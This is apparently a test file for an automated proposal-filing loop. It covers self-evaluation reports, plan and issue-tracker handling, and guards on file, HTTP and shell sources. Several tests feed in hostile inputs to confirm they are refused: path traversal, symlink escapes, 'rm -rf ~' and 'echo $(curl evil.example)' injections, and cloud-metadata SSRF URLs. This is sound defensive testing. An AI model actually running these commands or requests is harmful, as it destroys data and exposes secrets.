    // Tallied by taxonomy token and glossed, commonest first — and an `abandoned`
    // proposal is explained too, not just a `rejected` one (#2689).
    expect(report).toContain(
      'Why the rest were closed: the user declined it (closed as not planned) (2); already tracked elsewhere (duplicate) (1)'
    );
  });

  it('omits the rejection clause when every resolved proposal merged (#2689)', () => {
    const report = computeSelfEvalSummary({ outcomes: [{ outcome: 'merged' }, { outcome: 'merged' }] });
    expect(report).toContain('2 of 2 resolved proposals merged (100%)');
    expect(report).not.toContain('Why the rest were closed');
  });

  it('flags a below-floor sample as unreadable rather than as evidence', () => {
    const report = computeSelfEvalSummary({ outcomes: [{ outcome: 'rejected' }] });
    expect(report).toContain('too small a sample to read a rate from yet');
    // One rejection is not a merge-rate signal → confidence must not count it.
    expect(report).toContain('Reasoning confidence: low');
  });

  it('counts open and still-suppressed closed proposals so the loop does not re-file', () => {
    const now = Date.now();
    const report = computeSelfEvalSummary({
      existingIssues: [
        { slug: 'a', state: 'open' },
        { slug: 'b', state: 'open' },
        { slug: 'c', state: 'closed', closedAt: new Date(now - 5 * 24 * 60 * 60 * 1000).toISOString() },
        // Closed long ago → out of the window → re-proposable, so NOT counted.
        { slug: 'd', state: 'closed', closedAt: new Date(now - 90 * 24 * 60 * 60 * 1000).toISOString() }
      ],
      now
    });
    expect(report).toContain('2 open, plus 1 closed but still within the 30-day suppression window');
    expect(report).toContain('deterministically suppressed');
  });

  it('NAMES the closed-but-suppressed proposals, not just their count', () => {
    const now = Date.now();
    const recent = new Date(now - 5 * 24 * 60 * 60 * 1000).toISOString();
    const report = computeSelfEvalSummary({
      existingIssues: [
        { number: 12, title: 'Add telemetry', body: '<!-- lil-slug: add-telemetry -->', state: 'closed', closedAt: recent },
        // The plan filer's bare shape carries a slug and nothing else.
        { slug: 'fix-thing', state: 'closed' }
      ],
      now
    });
    // A closed issue appears nowhere else in the prompt — the reasoner can only
    // avoid re-proposing it if selfEval names its dedup key.
    expect(report).toContain('Recently closed (do NOT re-propose):');
    expect(report).toContain('#12 [add-telemetry] Add telemetry');
    expect(report).toContain('[fix-thing]');
  });

  it('annotates each named suppressed proposal with WHY it was closed (#2689 feedback loop)', () => {
    const now = Date.now();
    const recent = new Date(now - 5 * 24 * 60 * 60 * 1000).toISOString();
    const report = computeSelfEvalSummary({
      // The reconciled outcome store carries the rejection diagnosis per slug.
      outcomes: [
        { appId: 'a', slug: 'add-telemetry', outcome: 'rejected', rejectionReason: 'scope-mismatch' },
        { appId: 'a', slug: 'fix-thing', outcome: 'abandoned', rejectionReason: 'duplicate' }
      ],
      existingIssues: [
        { number: 12, title: 'Add telemetry', body: '<!-- lil-slug: add-telemetry -->', state: 'closed', closedAt: recent },
        { slug: 'fix-thing', state: 'closed' }
      ],
      now
    });
    // The reasoner sees the specific failure pattern, not merely a slug to route around.
    expect(report).toContain("#12 [add-telemetry] Add telemetry — previously closed: outside the app's scope");
    expect(report).toContain('[fix-thing] — previously closed: already tracked elsewhere (duplicate)');
  });

  it('leaves an undiagnosed suppressed proposal unannotated', () => {
    const now = Date.now();
    const recent = new Date(now - 5 * 24 * 60 * 60 * 1000).toISOString();
    const report = computeSelfEvalSummary({
      // No outcomes gathered this run — the line renders exactly as before.
      outcomes: null,
      existingIssues: [
        { number: 12, title: 'Add telemetry', body: '<!-- lil-slug: add-telemetry -->', state: 'closed', closedAt: recent }
      ],
      now
    });
    expect(report).toContain('#12 [add-telemetry] Add telemetry');
    expect(report).not.toContain('previously closed:');
  });

  it('does not annotate a proposal closed with the unknown-reason sentinel', () => {
    const now = Date.now();
    const recent = new Date(now - 5 * 24 * 60 * 60 * 1000).toISOString();
    const report = computeSelfEvalSummary({
      // Reconciled but undiagnosable: the sentinel is not an actionable failure pattern,
      // so the "do NOT re-propose" line names it without a spurious reason gloss.
      outcomes: [{ appId: 'a', slug: 'add-telemetry', outcome: 'rejected', rejectionReason: 'unknown-reason' }],
      existingIssues: [
        { number: 12, title: 'Add telemetry', body: '<!-- lil-slug: add-telemetry -->', state: 'closed', closedAt: recent }
      ],
      now
    });
    expect(report).toContain('#12 [add-telemetry] Add telemetry');
    expect(report).not.toContain('previously closed:');
  });

  it('caps the named list and counts the remainder', () => {
    const now = Date.now();
    const closedAt = new Date(now - 24 * 60 * 60 * 1000).toISOString();
    const existingIssues = Array.from({ length: SELF_EVAL_MAX_SUPPRESSED_LISTED + 3 }, (_, i) => ({
      slug: `item-${i}`, state: 'closed', closedAt
    }));
    const report = computeSelfEvalSummary({ existingIssues, now });
    expect(report).toContain('[item-0]');
    expect(report).toContain('(+3 more)');
    expect(report).not.toContain(`[item-${SELF_EVAL_MAX_SUPPRESSED_LISTED}]`);
  });

  it('leaves an unidentifiable suppressed entry to the count rather than a mystery bullet', () => {
    const now = Date.now();
    const report = computeSelfEvalSummary({
      existingIssues: [{ state: 'closed', closedAt: new Date(now - 1000).toISOString() }],
      now
    });
    expect(report).toContain('plus 1 closed but still within the 30-day suppression window');
    expect(report).not.toContain('Recently closed (do NOT re-propose):');
  });

  it('says so plainly when nothing is suppressed', () => {
    const report = computeSelfEvalSummary({ existingIssues: [] });
    expect(report).toContain('0 open');
    expect(report).toContain('Nothing is currently suppressed');
  });

  it('treats a failed tracker read (null) as unknown, never as "nothing filed"', () => {
    const report = computeSelfEvalSummary({ existingIssues: null });
    expect(report).toContain('Your already-filed proposals: UNKNOWN');
    expect(report).toContain('may be about to re-file something that already exists');
    expect(report).not.toContain('0 open');
  });

  it('distinguishes an unreadable learning store from a loop that has never run', () => {
    expect(computeSelfEvalSummary({ liTaskStats: { read: false, metrics: null } }))
      .toContain('LI execution health: UNAVAILABLE');
    expect(computeSelfEvalSummary({ liTaskStats: { read: true, metrics: null } }))
      .toContain('no LI runs recorded yet');
  });

  it('adds degraded-execution guidance when LI run success is under the threshold', () => {
    const report = computeSelfEvalSummary({
      liTaskStats: liMetrics({ completed: 9, succeeded: 3, failed: 6, successRate: 33 })
    });
    expect(report).toContain('33% of 9 lifetime LI runs succeeded — DEGRADED');
    expect(report).toContain('GUIDANCE — your own execution is degraded');
    expect(report).toContain('the problem may be THIS LOOP, not the app');
    expect(report).toContain('do not mark anything trivial+safe for hand-off');
  });

  it('does not fire the degraded warning on a healthy loop', () => {
    const report = computeSelfEvalSummary({ liTaskStats: liMetrics() });
    expect(report).toContain('80% of 10 lifetime LI runs succeeded');
    expect(report).not.toContain('DEGRADED');
    expect(report).not.toContain('execution is degraded');
  });

  it('does not fire the degraded warning below the sample floor', () => {
    const report = computeSelfEvalSummary({
      liTaskStats: liMetrics({ completed: 1, succeeded: 0, failed: 1, successRate: 0 })
    });
    expect(report).toContain('too small a sample to judge');
    expect(report).not.toContain('DEGRADED');
  });

  it('rates confidence high with all three signals, and drops guidance', () => {
    const outcomes = Array.from({ length: 6 }, () => ({ outcome: 'merged' }));
    const report = computeSelfEvalSummary({
      outcomes,
      existingIssues: [{ slug: 'a', state: 'open' }],
      liTaskStats: liMetrics()
    });
    expect(report).toContain('Reasoning confidence: high (3 of 3 self-signals available)');
    expect(report).not.toContain('GUIDANCE — low self-confidence');
  });

  it('rates a well-measured 0% merge rate as HIGH confidence in a bad result, not low', () => {
    // Confidence rates the EVIDENCE, not the news. A loop with solid evidence that
    // it is failing should act decisively, not hedge as if it were flying blind.
    const outcomes = Array.from({ length: 8 }, () => ({ outcome: 'rejected', rejectionReason: 'user-rejected' }));
    const report = computeSelfEvalSummary({
      outcomes,
      existingIssues: [{ slug: 'a', state: 'open' }],
      liTaskStats: liMetrics()
    });
    expect(report).toContain('0 of 8 resolved proposals merged (0%)');
    expect(report).toContain('Reasoning confidence: high');
    expect(report).not.toContain('GUIDANCE — low self-confidence');
  });

  it('rates confidence medium with two of three signals', () => {
    const report = computeSelfEvalSummary({
      outcomes: Array.from({ length: 5 }, () => ({ outcome: 'merged' })),
      existingIssues: [],
      liTaskStats: { read: false, metrics: null }
    });
    expect(report).toContain('Reasoning confidence: medium (2 of 3 self-signals available)');
    expect(report).not.toContain('GUIDANCE — low self-confidence');
  });

  it('exposes the degraded thresholds', () => {
    expect(LI_DEGRADED_SUCCESS_THRESHOLD).toBe(50);
    expect(LI_DEGRADED_MIN_SAMPLE).toBe(4);
  });

  it('honors the injected clock when ageing the LI run window', () => {
    const now = Date.now();
    const DAY_MS = 24 * 60 * 60 * 1000;
    // 6 in-window failures (enough for the 'windowed' branch, which needs >= 5)
    // alongside a lifetime rate that says the loop is healthy: the windowed read
    // must win, which it can only do if `now` reaches computeWindowedStats.
    const recentOutcomes = Array.from({ length: 6 }, (_, i) => ({
      t: new Date(now - (i + 1) * DAY_MS).toISOString(), s: false
    }));
    const liTaskStats = { read: true, metrics: { completed: 50, succeeded: 50, failed: 0, successRate: 100, recentOutcomes } };
    expect(computeSelfEvalSummary({ liTaskStats, now })).toContain('0% of 6 windowed LI runs succeeded — DEGRADED');
    // Wind the clock past the window: the same ring ages out and the lifetime rate
    // takes over. A hard-wired Date.now() would report DEGRADED here too.
    const later = now + 365 * DAY_MS;
    expect(computeSelfEvalSummary({ liTaskStats, now: later })).toContain('100% of 50 lifetime LI runs succeeded');
  });
});

describe('LI_TASK_TYPE (#2700)', () => {
  // The learning store keys LI's runs by extractTaskType, whose FIRST branch
  // prefixes any task carrying an analysisType. Asserting against the real
  // function (not a restated literal) is the point: a hand-written
  // 'layered-intelligence' silently matches no bucket, leaving execution health
  // permanently reading "no LI runs recorded yet" with every test still green.
  it('matches the key extractTaskType records a real scheduled LI task under', () => {
    // The task shape cosTaskGenerator.generateSelfImprovementTaskForType builds.
    const liTask = { metadata: { analysisType: LI_SCHEDULED_TASK_TYPE, autoGenerated: true, selfImprovement: true } };
    expect(LI_TASK_TYPE).toBe(extractTaskType(liTask));
  });

  it('is the self-improve-prefixed key, NOT the bare schedule name', () => {
    expect(LI_SCHEDULED_TASK_TYPE).toBe('layered-intelligence');
    expect(LI_TASK_TYPE).toBe('self-improve:layered-intelligence');
    expect(LI_TASK_TYPE).not.toBe(LI_SCHEDULED_TASK_TYPE);
  });
});

describe('readLiTaskMetrics (#2700)', () => {
  let dir;
  beforeEach(async () => { dir = await mkdtemp(join(tmpdir(), 'lil-selfeval-')); });
  afterEach(async () => { await rm(dir, { recursive: true, force: true }); });

  it('treats an ABSENT store as a fresh install (read:true), not a broken read', async () => {
    // learning.json is created lazily on the first recorded outcome — a fresh
    // install must be told "no LI runs recorded yet", never "your store is broken".
    expect(await readLiTaskMetrics({ cosPath: dir })).toEqual({ read: true, metrics: null });
  });

  it('reports read:false when the store exists but is unparseable', async () => {
    await writeFile(join(dir, 'learning.json'), '{ not json');
    expect(await readLiTaskMetrics({ cosPath: dir })).toEqual({ read: false, metrics: null });
  });

  it('reports read:false when the store is malformed (no byTaskType map)', async () => {
    await writeFile(join(dir, 'learning.json'), JSON.stringify({ byTaskType: [] }));
    expect(await readLiTaskMetrics({ cosPath: dir })).toEqual({ read: false, metrics: null });
  });

  it('reports read:true with a null bucket when LI has never run (distinct from unreadable)', async () => {
    await writeFile(join(dir, 'learning.json'), JSON.stringify({ byTaskType: { 'idle-review': { completed: 3 } } }));
    expect(await readLiTaskMetrics({ cosPath: dir })).toEqual({ read: true, metrics: null });
  });

  it('returns the layered-intelligence bucket when present', async () => {
    const bucket = { completed: 4, succeeded: 1, failed: 3, successRate: 25, recentOutcomes: [] };
    await writeFile(join(dir, 'learning.json'), JSON.stringify({ byTaskType: { [LI_TASK_TYPE]: bucket } }));
    const stats = await readLiTaskMetrics({ cosPath: dir });
    expect(stats.read).toBe(true);
    expect(stats.metrics.successRate).toBe(25);
  });
});

describe('extractPlanSlugs', () => {
  it('collects lil-tagged slugs with their checkbox state from PLAN.md content', () => {
    const plan = `## Next Up\n- [ ] [lil-add-metrics] Add metrics\n- [ ] [lil-fix-thing] Fix\n- [ ] [ref-watch-other] not ours`;
    expect(extractPlanSlugs(plan)).toEqual([
      { slug: 'add-metrics', state: 'open' },
      { slug: 'fix-thing', state: 'open' }
    ]);
  });

  it('reads a checked `- [x]` item as closed and an unchecked one as open (#2435)', () => {
    const plan = `## Done\n- [x] [lil-add-metrics] Add metrics\n## Next Up\n- [ ] [lil-fix-thing] Fix`;
    expect(extractPlanSlugs(plan)).toEqual([
      { slug: 'add-metrics', state: 'closed' },
      { slug: 'fix-thing', state: 'open' }
    ]);
  });

  it('treats an uppercase `- [X]` checkbox as closed', () => {
    expect(extractPlanSlugs('- [X] [lil-shipped] done')).toEqual([
      { slug: 'shipped', state: 'closed' }
    ]);
  });

  it('treats a bare tag with no checkbox as open (absent ≠ done)', () => {
    // A tag mentioned inline, with no list checkbox, must NOT collapse to closed
    // (which would mark it completed in the outcome loop) — it stays open.
    expect(extractPlanSlugs('see [lil-inline-ref] elsewhere')).toEqual([
      { slug: 'inline-ref', state: 'open' }
    ]);
  });

  it('returns [] for non-string / empty', () => {
    expect(extractPlanSlugs(null)).toEqual([]);
    expect(extractPlanSlugs('')).toEqual([]);
  });
});

describe('appendProposalToPlan', () => {
  let dir;
  beforeEach(async () => { dir = await mkdtemp(join(tmpdir(), 'lil-plan-')); });
  afterEach(async () => { await rm(dir, { recursive: true, force: true }); });

  it('creates PLAN.md with a Next Up section when absent', async () => {
    const res = await appendProposalToPlan({ repoPath: dir, appName: 'App', slug: 'add-x', title: 'Add X', body: 'do it' });
    expect(res).toEqual({ success: true, duplicate: false });
    const content = await readFile(join(dir, 'PLAN.md'), 'utf-8');
    expect(content).toContain('# App — Development Plan');
    expect(content).toContain('## Next Up');
    expect(content).toContain('[lil-add-x]');
  });

  it('is a no-op (duplicate) when the slug tag already exists', async () => {
    await writeFile(join(dir, 'PLAN.md'), '## Next Up\n- [ ] [lil-add-x] existing\n');
    const res = await appendProposalToPlan({ repoPath: dir, appName: 'App', slug: 'add-x', title: 'Add X', body: 'b' });
    expect(res.duplicate).toBe(true);
  });

  it('inserts under an existing Next Up heading that has NO trailing newline (no duplicate section)', async () => {
    await writeFile(join(dir, 'PLAN.md'), '# Plan\n\n## Next Up'); // ends at heading, no newline
    const res = await appendProposalToPlan({ repoPath: dir, appName: 'App', slug: 'add-x', title: 'Add X', body: 'b' });
    expect(res.duplicate).toBe(false);
    const content = await readFile(join(dir, 'PLAN.md'), 'utf-8');
    // Exactly one Next Up section, item on its own line.
    expect(content.match(/## Next Up/g)).toHaveLength(1);
    expect(content).toContain('\n- [ ] [lil-add-x]');
  });

  it('appends a Next Up section when the file exists without one', async () => {
    await writeFile(join(dir, 'PLAN.md'), '# Plan\n\nSome notes.\n');
    await appendProposalToPlan({ repoPath: dir, appName: 'App', slug: 'add-x', title: 'Add X', body: 'b' });
    const content = await readFile(join(dir, 'PLAN.md'), 'utf-8');
    expect(content).toContain('## Next Up');
    expect(content).toContain('[lil-add-x]');
  });
});

describe('normalizeIssueState', () => {
  it('maps GitLab "opened" and GitHub "open" to open', () => {
    expect(normalizeIssueState('opened')).toBe('open');
    expect(normalizeIssueState('OPEN')).toBe('open');
  });
  it('maps closed/locked to closed', () => {
    expect(normalizeIssueState('closed')).toBe('closed');
    expect(normalizeIssueState('locked')).toBe('closed');
  });
  it('treats unknown/empty as open (fail-open so dedup does not miss)', () => {
    expect(normalizeIssueState('')).toBe('open');
    expect(normalizeIssueState(undefined)).toBe('open');
  });
});

describe('gatherSources custom file confinement', () => {
  let dir;
  beforeEach(async () => { dir = await mkdtemp(join(tmpdir(), 'lil-src-')); });
  afterEach(async () => { await rm(dir, { recursive: true, force: true }); });

  it('reads a safe relative custom file', async () => {
    await writeFile(join(dir, 'METRICS.md'), 'metric content');
    const out = await gatherSources(
      { repoPath: dir },
      { sources: { custom: [{ type: 'file', ref: 'METRICS.md' }] } }
    );
    expect(out['custom:METRICS.md']).toBe('metric content');
  });

  it('refuses a "../" traversal ref (no arbitrary file leak into the prompt)', async () => {
    // A file one level ABOVE the repo must never be read.
    await writeFile(join(dir, 'secret.txt'), 'SECRET');
    const sub = join(dir, 'repo');
    const { mkdir } = await import('fs/promises');
    await mkdir(sub, { recursive: true });
    const out = await gatherSources(
      { repoPath: sub },
      { sources: { custom: [{ type: 'file', ref: '../secret.txt' }] } }
    );
    expect(Object.keys(out)).not.toContain('custom:../secret.txt');
  });

  it('refuses an absolute-path ref', async () => {
    const out = await gatherSources(
      { repoPath: dir },
      { sources: { custom: [{ type: 'file', ref: '/etc/hosts' }] } }
    );
    expect(Object.keys(out).some(k => k.startsWith('custom:'))).toBe(false);
  });

  it('refuses a symlink inside the repo that points OUTSIDE it', async () => {
    const { mkdir, symlink } = await import('fs/promises');
    const repo = join(dir, 'repo');
    await mkdir(repo, { recursive: true });
    const secret = join(dir, 'outside-secret.txt');
    await writeFile(secret, 'OUTSIDE_SECRET');
    await symlink(secret, join(repo, 'inside-link'));
    const out = await gatherSources(
      { repoPath: repo },
      { sources: { custom: [{ type: 'file', ref: 'inside-link' }] } }
    );
    expect(Object.keys(out).some(k => k.startsWith('custom:'))).toBe(false);
  });

  it('allows a symlink that resolves to a file INSIDE the repo', async () => {
    const { symlink } = await import('fs/promises');
    await writeFile(join(dir, 'real.md'), 'INSIDE');
    await symlink(join(dir, 'real.md'), join(dir, 'link.md'));
    const out = await gatherSources(
      { repoPath: dir },
      { sources: { custom: [{ type: 'file', ref: 'link.md' }] } }
    );
    expect(out['custom:link.md']).toBe('INSIDE');
  });

  it('drops a non-allowlisted custom cmd source when shell trust is off (#2515)', async () => {
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});
    const out = await gatherSources(
      { repoPath: dir },
      { sources: { custom: [{ type: 'cmd', cmd: 'rm -rf /tmp/x' }] } },
      { trustShellSources: false } // injected so no settings.json read
    );
    expect(Object.keys(out).some(k => k.startsWith('custom:cmd:'))).toBe(false);
    warn.mockRestore();
  });

  it('runs an allowlisted custom cmd source and captures stdout (#2515)', async () => {
    // Real allowlisted `echo` through the shell:false runner — deterministic.
    const out = await gatherSources(
      { repoPath: dir },
      { sources: { custom: [{ type: 'cmd', cmd: 'echo hello-source' }] } },
      { trustShellSources: false }
    );
    expect(out['custom:cmd:echo hello-source']).toBe('hello-source');
  });
});

describe('gatherSources appMetrics (METRICS.md)', () => {
  let dir;
  beforeEach(async () => { dir = await mkdtemp(join(tmpdir(), 'lil-metrics-')); });
  afterEach(async () => { await rm(dir, { recursive: true, force: true }); });

  it('reads the app repo METRICS.md as the appMetrics source', async () => {
    await writeFile(join(dir, 'METRICS.md'), '# Metrics\nWeekly active users: up');
    const out = await gatherSources({ repoPath: dir }, { sources: { appMetrics: true } });
    expect(out.appMetrics).toContain('Weekly active users');
  });

  it('omits appMetrics when no METRICS.md exists (reasoner may then propose adding one)', async () => {
    const out = await gatherSources({ repoPath: dir }, { sources: { appMetrics: true } });
    expect(out.appMetrics).toBeUndefined();
  });

  it('does not read METRICS.md when the source is off', async () => {
    await writeFile(join(dir, 'METRICS.md'), 'present');
    const out = await gatherSources({ repoPath: dir }, { sources: { appMetrics: false } });
    expect(out.appMetrics).toBeUndefined();
  });
});

describe('customSourceKey', () => {
  it('namespaces by type so file/http/cmd never collide', () => {
    expect(customSourceKey({ type: 'file', ref: 'x' })).toBe('custom:x');
    expect(customSourceKey({ type: 'http', url: 'https://x' })).toBe('custom:http:https://x');
    expect(customSourceKey({ type: 'cmd', cmd: 'git log' })).toBe('custom:cmd:git log');
  });
  it('returns null for a malformed/blank source', () => {
    expect(customSourceKey(null)).toBeNull();
    expect(customSourceKey({ type: 'file' })).toBeNull();
    expect(customSourceKey({ type: 'nope', ref: 'x' })).toBeNull();
  });
});

describe('fetchHttpSource', () => {
  it('returns body text on a 2xx http(s) response', async () => {
    const fetchText = vi.fn().mockResolvedValue('remote body');
    expect(await fetchHttpSource('https://example.com/x', { fetchText })).toBe('remote body');
    // Routed through the SSRF-guarded fetcher, failing soft (no thrown 400).
    expect(fetchText).toHaveBeenCalledWith('https://example.com/x', expect.objectContaining({ throwOnUnsafe: false }));
  });
  it('rejects a non-http scheme without calling the fetcher', async () => {
    const fetchText = vi.fn();
    expect(await fetchHttpSource('file:///etc/hosts', { fetchText })).toBeNull();
    expect(fetchText).not.toHaveBeenCalled();
  });
  it('returns null when the fetcher yields null (non-ok / dead URL)', async () => {
    const fetchText = vi.fn().mockResolvedValue(null);
    expect(await fetchHttpSource('https://example.com/x', { fetchText })).toBeNull();
  });
  it('returns null when the fetcher throws (timeout)', async () => {
    const fetchText = vi.fn().mockRejectedValue(new Error('boom'));
    expect(await fetchHttpSource('https://example.com/x', { fetchText })).toBeNull();
  });

  // SSRF: exercise the REAL fetchPublicText guard (default injected). IP-literal
  // hosts are classified synchronously — no network — so these are deterministic.
  it('blocks the cloud-metadata endpoint (169.254.169.254) — omits the key, no network', async () => {
    expect(await fetchHttpSource('http://169.254.169.254/latest/meta-data/')).toBeNull();
  });
  it('blocks IPv4 loopback (127.0.0.1)', async () => {
    expect(await fetchHttpSource('http://127.0.0.1:5555/api/settings')).toBeNull();
  });
  it('blocks IPv6 loopback ([::1])', async () => {
    expect(await fetchHttpSource('http://[::1]/')).toBeNull();
  });
  it('blocks named cloud-metadata endpoints inside allowed private ranges (Alibaba/AWS IMDS)', async () => {
    expect(await fetchHttpSource('http://100.100.100.200/latest/meta-data/')).toBeNull();
    expect(await fetchHttpSource('http://[fd00:ec2::254]/latest/meta-data/')).toBeNull();
  });
  it('allows a public URL through the guard (real fetch stubbed at fetchText seam)', async () => {
    const fetchText = vi.fn().mockResolvedValue('public body');
    expect(await fetchHttpSource('https://example.com/feed', { fetchText })).toBe('public body');
  });
});

describe('runShellCommand (restricted by default — #2515)', () => {
  it('runs an allowlisted command with parsed args and shell:false, returns trimmed stdout', async () => {
    const exec = vi.fn().mockResolvedValue({ code: 0, stdout: '  out\n', stderr: '' });
    expect(await runShellCommand('git log --oneline', { cwd: '/x', exec })).toBe('out');
    // Parsed to base binary + args, spawned WITHOUT a shell (no string interpretation).
    expect(exec).toHaveBeenCalledWith('git', ['log', '--oneline'], expect.objectContaining({ cwd: '/x', shell: false }));
  });
  it('returns null on non-zero exit (allowlisted binary)', async () => {
    const exec = vi.fn().mockResolvedValue({ code: 1, stdout: 'partial', stderr: 'err' });
    expect(await runShellCommand('git status', { cwd: '/x', exec })).toBeNull();
  });
  it('returns null on a timed-out command (code -1)', async () => {
    const exec = vi.fn().mockResolvedValue({ code: -1, stdout: '', stderr: '', timedOut: true });
    expect(await runShellCommand('cat big', { cwd: '/x', exec })).toBeNull();
  });
  it('returns null on empty command without invoking exec', async () => {
    const exec = vi.fn();
    expect(await runShellCommand('   ', { cwd: '/x', exec })).toBeNull();
    expect(exec).not.toHaveBeenCalled();
  });
  it('rejects a non-allowlisted binary without spawning', async () => {
    const exec = vi.fn();
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});
    expect(await runShellCommand('rm -rf /tmp/x', { cwd: '/x', exec })).toBeNull();
    expect(exec).not.toHaveBeenCalled();
    expect(warn).toHaveBeenCalled();
    warn.mockRestore();
  });
  it('rejects a command with shell metacharacters (injection) without spawning', async () => {
    const exec = vi.fn();
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});
    // Even though `git` is allowlisted, the `;`/`|`/`$()` chaining is denied.
    expect(await runShellCommand('git log; rm -rf ~', { cwd: '/x', exec })).toBeNull();
    expect(await runShellCommand('git log | sh', { cwd: '/x', exec })).toBeNull();
    expect(await runShellCommand('echo $(curl evil.example)', { cwd: '/x', exec })).toBeNull();
    expect(exec).not.toHaveBeenCalled();
    warn.mockRestore();
  });
  it('escape hatch: trustShellSources restores full shell:true execution', async () => {
    const exec = vi.fn().mockResolvedValue({ code: 0, stdout: 'piped\n', stderr: '' });
    expect(await runShellCommand('git log --oneline | head', { cwd: '/x', exec, trustShellSources: true })).toBe('piped');
    // Full string handed to the shell verbatim (opt-in only).
    expect(exec).toHaveBeenCalledWith('git log --oneline | head', [], expect.objectContaining({ cwd: '/x', shell: true }));
  });
});

describe('getTrustShellSources (install-level opt-in — #2515)', () => {
  it('only an explicit true unlocks the shell', async () => {
    expect(await getTrustShellSources(async () => ({ layeredIntelligence: { trustShellSources: true } }))).toBe(true);
    expect(await getTrustShellSources(async () => ({ layeredIntelligence: { trustShellSources: false } }))).toBe(false);
    expect(await getTrustShellSources(async () => ({ layeredIntelligence: {} }))).toBe(false);
    expect(await getTrustShellSources(async () => ({}))).toBe(false);
    expect(await getTrustShellSources(async () => ({ layeredIntelligence: { trustShellSources: 'yes' } }))).toBe(false);
  });
});

describe('forge I/O (injected exec)', () => {
  it('listForgeIssues parses gh JSON and extracts slugs', async () => {
    const exec = vi.fn().mockResolvedValue({
      code: 0,
      stdout: JSON.stringify([
        { number: 1, title: 'A', body: `x ${slugMarker('slug-a')}`, state: 'OPEN', closedAt: null },
        { number: 2, title: 'B', body: 'no slug', state: 'CLOSED', closedAt: '2026-07-01T00:00:00Z' }
      ])
    });
    const { ok, issues } = await listForgeIssues({ cli: 'gh', cwd: '/x', exec });
    expect(ok).toBe(true);
    expect(issues[0].slug).toBe('slug-a');
    expect(issues[0].state).toBe('open');
    expect(issues[1].closedAt).toBe('2026-07-01T00:00:00Z');
  });

  it('listForgeIssues requests comments and threads the closing comment on gh rows (#2748)', async () => {
    const exec = vi.fn().mockResolvedValue({
      code: 0,
      stdout: JSON.stringify([
        {
          number: 3,
          title: 'C',
          body: `x ${slugMarker('slug-c')}`,
          state: 'CLOSED',
          closedAt: '2026-07-02T00:00:00Z',
          comments: [
            { body: 'Interesting idea.' },
            { body: 'Closing — this is out of scope for the app.' }
          ]
        }
      ])
    });
    const { ok, issues } = await listForgeIssues({ cli: 'gh', cwd: '/x', exec });
    expect(ok).toBe(true);
    // The batched list call must ask gh for `comments` so no extra fetch is needed.
    expect(exec.mock.calls[0][1]).toContain('number,title,body,state,stateReason,closedAt,url,labels,comments');
    // The LAST comment (closest to the close) becomes the classifier's signal.
    expect(issues[0].closingComment).toBe('Closing — this is out of scope for the app.');
  });

  it('listForgeIssues leaves closingComment null when gh returns no comments', async () => {
    const exec = vi.fn().mockResolvedValue({
      code: 0,
      stdout: JSON.stringify([{ number: 4, title: 'D', body: `x ${slugMarker('slug-d')}`, state: 'CLOSED', comments: [] }])
    });
    const { issues } = await listForgeIssues({ cli: 'gh', cwd: '/x', exec });
    expect(issues[0].closingComment).toBeNull();
  });

  it('extractClosingComment returns the last non-empty comment body, else null', () => {
    expect(extractClosingComment([{ body: 'first' }, { body: '  ' }, { body: 'last real' }])).toBe('last real');
    expect(extractClosingComment([{ body: 'only' }])).toBe('only');
    expect(extractClosingComment([])).toBeNull();
    expect(extractClosingComment(null)).toBeNull();
    expect(extractClosingComment([{ body: '   ' }, { body: null }])).toBeNull();
  });

  it('listForgeIssues normalizes GitLab "opened" state to open', async () => {
    const exec = vi.fn().mockResolvedValue({
      code: 0,
      stdout: JSON.stringify([{ iid: 7, title: 'G', description: `d ${slugMarker('g-slug')}`, state: 'opened' }])
    });
    const { ok, issues } = await listForgeIssues({ cli: 'glab', cwd: '/x', exec });
    expect(ok).toBe(true);
    expect(issues[0].number).toBe(7);
    expect(issues[0].state).toBe('open'); // 'opened' → 'open'
    expect(issues[0].slug).toBe('g-slug');
  });

  it('listForgeIssues signals ok:false on CLI failure (tracker unavailable ≠ empty)', async () => {
    const exec = vi.fn().mockResolvedValue({ code: 1, stdout: '' });
    expect(await listForgeIssues({ cli: 'gh', cwd: '/x', exec })).toEqual({ ok: false, issues: [] });
  });

  it('listForgeIssues signals ok:true, [] on a successful empty read', async () => {
    const exec = vi.fn().mockResolvedValue({ code: 0, stdout: '' });
    expect(await listForgeIssues({ cli: 'gh', cwd: '/x', exec })).toEqual({ ok: true, issues: [] });
  });

  it('listForgeIssues signals ok:false on unparseable output', async () => {
    const exec = vi.fn().mockResolvedValue({ code: 0, stdout: 'not json' });
    expect(await listForgeIssues({ cli: 'gh', cwd: '/x', exec })).toEqual({ ok: false, issues: [] });
  });

  it('listBlockingIssues uses the blocking label and normalizes state', async () => {
    const exec = vi.fn().mockResolvedValue({ code: 0, stdout: JSON.stringify([{ number: 5, state: 'open' }]) });
    const res = await listBlockingIssues({ cli: 'gh', cwd: '/x', exec });
    expect(res).toEqual({ ok: true, issues: [{ number: 5, title: '', state: 'open' }] });
    expect(exec.mock.calls[0][1]).toContain(LI_BLOCKING_LABEL);
  });

  it('ensureForgeLabels creates both labels for gh', async () => {
    const exec = vi.fn().mockResolvedValue({ code: 0, stdout: '' });
    await ensureForgeLabels({ cli: 'gh', cwd: '/x', exec });
    const created = exec.mock.calls.map(c => c[1][2]); // gh: ['label','create',<name>,...]
    expect(created).toContain(LI_LABEL);
    expect(created).toContain(LI_BLOCKING_LABEL);
    // gh uses --force for idempotency
    expect(exec.mock.calls[0][1]).toContain('--force');
  });

  it('fileProposalToForge embeds slug marker and returns issue number from URL', async () => {
    const exec = vi.fn()
      .mockResolvedValueOnce({ code: 0, stdout: '' }) // label create
      .mockResolvedValueOnce({ code: 0, stdout: '' }) // label create
      .mockResolvedValueOnce({ code: 0, stdout: 'https://github.com/o/r/issues/123\n' });
    const res = await fileProposalToForge({ cli: 'gh', cwd: '/x', title: 'T', body: 'B', slug: 'my-slug', exec });
    expect(res.success).toBe(true);
    expect(res.number).toBe(123);
    // The create call body carries the slug marker.
    const createCall = exec.mock.calls[2][1];
    const bodyIdx = createCall.indexOf('--body') + 1;
    expect(createCall[bodyIdx]).toContain(slugMarker('my-slug'));
  });

  it('fileProposalToForge reports failure on nonzero exit', async () => {
    const exec = vi.fn()
      .mockResolvedValueOnce({ code: 0, stdout: '' })
      .mockResolvedValueOnce({ code: 0, stdout: '' })
      .mockResolvedValueOnce({ code: 1, stdout: '', stderr: 'boom' });
